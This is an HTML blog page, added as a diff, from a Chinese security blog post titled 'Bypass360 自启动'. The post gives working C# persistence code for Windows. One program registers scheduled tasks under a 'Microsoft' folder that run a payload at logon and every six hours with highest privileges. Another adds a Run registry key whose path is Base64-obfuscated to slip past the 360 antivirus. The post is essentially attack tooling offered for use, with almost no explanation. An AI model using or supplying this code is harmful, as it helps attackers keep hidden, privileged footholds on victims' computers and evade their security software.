@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple_touch_icon.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/apple_touch_icon.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"hide","padding":18,"offset":12,"onmobile":false,"dimmer":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="通过&#96;Windows Api&#96;绕过360进行权限维持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass360 自启动">
+<meta property="og:url" content="http://example.com/2021/01/07/Bypass360-SelfStarting/index.html">
+<meta property="og:site_name" content="行云">
+<meta property="og:description" content="通过&#96;Windows Api&#96;绕过360进行权限维持">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-07T12:07:33.000Z">
+<meta property="article:modified_time" content="2022-01-07T12:11:15.310Z">
+<meta property="article:author" content="行云">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/01/07/Bypass360-SelfStarting/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Bypass360 自启动 | 行云</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">行云</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fas fa-users fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/07/Bypass360-SelfStarting/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="行云">
+      <meta itemprop="description" content="千里江山 任我飞渡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="行云">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Bypass360 自启动
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-07 20:07:33" itemprop="dateCreated datePublished" datetime="2021-01-07T20:07:33+08:00">2021-01-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Bypass/" itemprop="url" rel="index"><span itemprop="name">Bypass</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" itemprop="url" rel="index"><span itemprop="name">权限维持</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <pre><code>通过`Windows Api`绕过360进行权限维持
+</code></pre>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><pre><code>需要一个`Interop.TaskScheduler.dll`
+</code></pre>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> TaskScheduler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">AddTasks</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">new</span> WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;需要管理员权限.&quot;</span>);</span><br><span class="line">                Process.GetCurrentProcess().Kill();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            AddTasks(<span class="string">&quot;1&quot;</span>, _TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON, <span class="string">&quot;Microsoft\\1&quot;</span>).Run(<span class="literal">null</span>);<span class="comment">//用户登录自启动</span></span><br><span class="line">            AddTasks(<span class="string">&quot;2&quot;</span>, _TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME, <span class="string">&quot;Microsoft\\2&quot;</span>).Run(<span class="literal">null</span>);<span class="comment">//自定义相隔时间启动</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IRegisteredTask <span class="title">AddTasks</span>(<span class="params"><span class="built_in">string</span> author, _TASK_TRIGGER_TYPE2 runType, <span class="built_in">string</span> taskPath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TaskSchedulerClass t = <span class="keyword">new</span> TaskSchedulerClass();</span><br><span class="line">            <span class="comment">// 连接</span></span><br><span class="line">            t.Connect(</span><br><span class="line">                serverName: <span class="literal">null</span>,<span class="comment">//主机名或IP</span></span><br><span class="line">                user: <span class="literal">null</span>,<span class="comment">//用户名</span></span><br><span class="line">                domain: <span class="literal">null</span>,<span class="comment">//域名</span></span><br><span class="line">                password: <span class="literal">null</span><span class="comment">//密码</span></span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取计划任务目录，\\为根目录</span></span><br><span class="line">            ITaskFolder folder = t.GetFolder(<span class="string">&quot;\\&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置参数</span></span><br><span class="line">            ITaskDefinition task = t.NewTask(<span class="number">0</span>);</span><br><span class="line">            task.RegistrationInfo.Author = author;<span class="comment">//创建者</span></span><br><span class="line">            task.RegistrationInfo.Description = <span class="string">&quot;tasks&quot;</span>;<span class="comment">//描述</span></span><br><span class="line">            task.Settings.Enabled = <span class="literal">true</span>;<span class="comment">//是否启用</span></span><br><span class="line">            <span class="comment">//触发方式</span></span><br><span class="line">            <span class="keyword">if</span> (runType == _TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME)</span><br><span class="line">            &#123;</span><br><span class="line">                ITimeTrigger tt = (ITimeTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME);</span><br><span class="line">                tt.Repetition.Interval = <span class="string">&quot;PT6H1M&quot;</span>;<span class="comment">//时间启动方式，每6小时启动一次</span></span><br><span class="line">                tt.StartBoundary = <span class="string">&quot;2020-04-09T14:27:25&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                task.Triggers.Create(runType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置动作</span></span><br><span class="line">            IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);</span><br><span class="line">            action.Path = <span class="string">@&quot;C:\Windows\Temp\task.exe&quot;</span>;<span class="comment">//设置文件目录</span></span><br><span class="line"></span><br><span class="line">            task.Settings.ExecutionTimeLimit = <span class="string">&quot;PT0S&quot;</span>; <span class="comment">//运行任务时间超时停止任务吗? PTOS 不开启超时</span></span><br><span class="line">            task.Settings.DisallowStartIfOnBatteries = <span class="literal">false</span>;<span class="comment">//只有在交流电源下才执行</span></span><br><span class="line">            task.Settings.RunOnlyIfIdle = <span class="literal">false</span>;<span class="comment">//仅当计算机空闲下才执行</span></span><br><span class="line">            task.Principal.RunLevel = _TASK_RUNLEVEL.TASK_RUNLEVEL_HIGHEST;<span class="comment">//管理员权限运行</span></span><br><span class="line"></span><br><span class="line">            IRegisteredTask regTask = folder.RegisterTaskDefinition(</span><br><span class="line">                taskPath,<span class="comment">//计划任务路径\\任务计划名称</span></span><br><span class="line">                task,<span class="comment">//此处需要设置任务的名称（name）</span></span><br><span class="line">                (<span class="built_in">int</span>)_TASK_CREATION.TASK_CREATE,</span><br><span class="line">                <span class="literal">null</span>, <span class="comment">//user</span></span><br><span class="line">                <span class="literal">null</span>, <span class="comment">//password</span></span><br><span class="line">                _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,</span><br><span class="line">                <span class="string">&quot;&quot;</span></span><br><span class="line">                );</span><br><span class="line">            <span class="keyword">switch</span> (runType)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> _TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;已写入：&quot;</span> + taskPath);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;用户登录启动&quot;</span>);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;启动文件路径 -&gt; &quot;</span> + action.Path + <span class="string">&quot;\n\r&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> _TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME:</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;已写入：&quot;</span> + taskPath);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;时间启动：每隔6小时1分钟启动一次&quot;</span>);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;启动文件路径 -&gt; &quot;</span> + action.Path + <span class="string">&quot;\n\r&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_DAILY:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;每天启动一次&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_EVENT:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;事件启动&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_WEEKLY:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_MONTHLY:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_MONTHLYDOW:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_IDLE:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_REGISTRATION:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_BOOT:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_SESSION_STATE_CHANGE:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="comment">//case _TASK_TRIGGER_TYPE2.TASK_TRIGGER_CUSTOM_TRIGGER_01:</span></span><br><span class="line">                <span class="comment">// Console.WriteLine(&quot;&quot;);</span></span><br><span class="line">                <span class="comment">// break;</span></span><br><span class="line">                <span class="literal">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> regTask;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>路径<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code><br>键名<code>GetDomain</code><br>执行<code>C:\Windows\Temp\task.exe</code></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.Win32;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">AddRegedit</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Console.WriteLine(Convert.ToBase64String(Encoding.Unicode.GetBytes(@&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;)));</span></span><br><span class="line">            <span class="comment">//Console.WriteLine(Convert.ToBase64String(Encoding.Unicode.GetBytes(@&quot;C:\Windows\Temp\task.exe&quot;)));</span></span><br><span class="line">            <span class="comment">//Console.ReadKey();</span></span><br><span class="line">            Add();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Add</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> addRegPath = Encoding.Unicode.GetString(Convert.FromBase64String(<span class="string">&quot;UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4A&quot;</span>));</span><br><span class="line">            RegistryKey oKey = Registry.CurrentUser.OpenSubKey(addRegPath, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            oKey.SetValue(<span class="string">&quot;GetDomain&quot;</span>, Encoding.Unicode.GetString(Convert.FromBase64String(<span class="string">&quot;程序路径&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>关注公众号可以订阅最新相关文章</div>
+
+  <!--<button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>-->
+
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/Public-WeChat.jpg" alt="行云 微信支付">
+
+        <!-- 注释掉这一行打赏提示 -->
+        <!-- <p>微信支付</p> -->
+        
+      </div>
+
+  </div>
+
+  <!-- 直接显示微信二维码 -->
+  <script>
+    var qr = document.getElementById('qr');
+    qr.style.display = 'block';
+  </script>
+
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/06/hello-world/" rel="next" title="Hello World">
+      Hello World <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">2.</span> <span class="nav-text">注册表</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="行云"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">行云</p>
+  <div class="site-description" itemprop="description">千里江山 任我飞渡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xingyun-cloud" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xingyun-cloud" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="far fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">行云</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
